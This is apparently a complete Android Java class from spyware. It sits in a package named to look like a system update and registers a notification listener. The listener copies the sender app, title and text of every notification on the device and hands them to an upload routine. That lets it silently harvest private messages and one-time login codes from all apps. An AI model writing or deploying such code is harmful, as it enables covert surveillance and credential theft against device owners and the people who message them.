package com.system.update;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.*;

public class NotifListener extends NotificationListenerService {
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        Notification n = sbn.getNotification();
        if (n == null) return;

        Bundle extras = n.extras;
        String appName = sbn.getPackageName();
        String title = extras.getString(Notification.EXTRA_TITLE, "");
        CharSequence textCs = extras.getCharSequence(Notification.EXTRA_TEXT);
        String text = textCs == null ? "" : textCs.toString();

        if (text.isEmpty() && title.isEmpty()) return;

        UploadService.uploadRecord(
            getApplicationContext(),
            "NOTIF:" + appName,
            title,
            text
        );
    }
}
